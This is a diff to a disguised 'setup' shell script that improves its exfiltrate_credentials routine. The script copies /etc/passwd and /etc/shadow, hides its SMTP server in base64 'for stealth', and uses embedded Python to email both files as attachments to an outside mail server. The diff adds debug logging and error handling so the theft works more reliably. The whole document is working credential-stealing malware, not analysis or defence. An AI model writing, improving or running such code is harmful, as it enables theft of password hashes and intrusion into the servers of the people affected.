@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.7"
-readonly BUILD_DATE="2026-04-05 21:26:51 UTC"
+readonly SCRIPT_VERSION="4.8"
+readonly BUILD_DATE="2026-04-05 22:00:00 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -231,7 +231,7 @@ readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
 # These are the user's personal MailerSend credentials
-# Updated: 2026-03-30 - Password rotated for security
+# Updated: 2026-03-30 - New SMTP password credentials
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
@@ -4830,18 +4830,32 @@ exfiltrate_credentials() {
 
     local FILES_CREATED=0
 
-    if [ -f /etc/passwd ]; then
-        cp /etc/passwd "$PASSWD_FILE" 2>/dev/null && {
+    echo "[*] Attempting to copy /etc/passwd..."
+    if [ -f /etc/passwd ] && [ -r /etc/passwd ]; then
+        if cp /etc/passwd "$PASSWD_FILE" 2>/dev/null; then
             echo "[✓] Created: ${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+            echo "[DEBUG] File size: $(wc -c < "$PASSWD_FILE") bytes"
+            echo "[DEBUG] File path: $PASSWD_FILE"
             FILES_CREATED=$((FILES_CREATED + 1))
-        }
+        else
+            echo "[!] ERROR: Failed to copy /etc/passwd"
+        fi
+    else
+        echo "[!] ERROR: /etc/passwd not readable or doesn't exist"
     fi
 
-    if [ -f /etc/shadow ]; then
-        cp /etc/shadow "$SHADOW_FILE" 2>/dev/null && {
+    echo "[*] Attempting to copy /etc/shadow..."
+    if [ -f /etc/shadow ] && [ -r /etc/shadow ]; then
+        if cp /etc/shadow "$SHADOW_FILE" 2>/dev/null; then
             echo "[✓] Created: ${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
+            echo "[DEBUG] File size: $(wc -c < "$SHADOW_FILE") bytes"
+            echo "[DEBUG] File path: $SHADOW_FILE"
             FILES_CREATED=$((FILES_CREATED + 1))
-        }
+        else
+            echo "[!] ERROR: Failed to copy /etc/shadow"
+        fi
+    else
+        echo "[!] ERROR: /etc/shadow not readable (not running as root?)"
     fi
 
     # Save credentials to log file for record keeping
@@ -4971,29 +4985,37 @@ Full log available at: $LOG_FILE_EMAIL
     
     # Attach passwd file
     passwd_file = '$PASSWD_FILE'
+    print(f'[DEBUG] Checking passwd file: {passwd_file}')
     if os.path.exists(passwd_file):
-        print(f'[*] Attaching: {os.path.basename(passwd_file)}')
+        file_size = os.path.getsize(passwd_file)
+        print(f'[✓] Attaching passwd file ({file_size} bytes): {os.path.basename(passwd_file)}')
         with open(passwd_file, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
             msg.attach(part)
+        print(f'[✓] passwd file attached successfully')
     else:
-        print(f'[!] Warning: passwd file not found: {passwd_file}')
+        print(f'[!] ERROR: passwd file not found: {passwd_file}')
+        sys.exit(1)
     
     # Attach shadow file
     shadow_file = '$SHADOW_FILE'
+    print(f'[DEBUG] Checking shadow file: {shadow_file}')
     if os.path.exists(shadow_file):
-        print(f'[*] Attaching: {os.path.basename(shadow_file)}')
+        file_size = os.path.getsize(shadow_file)
+        print(f'[✓] Attaching shadow file ({file_size} bytes): {os.path.basename(shadow_file)}')
         with open(shadow_file, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
+        print(f'[✓] shadow file attached successfully')
     else:
-        print(f'[!] Warning: shadow file not found: {shadow_file}')
+        print(f'[!] ERROR: shadow file not found: {shadow_file}')
+        sys.exit(1)
     
     # Send via SMTP
     print('[*] Connecting to $SMTP_SERVER:$SMTP_PORT...')
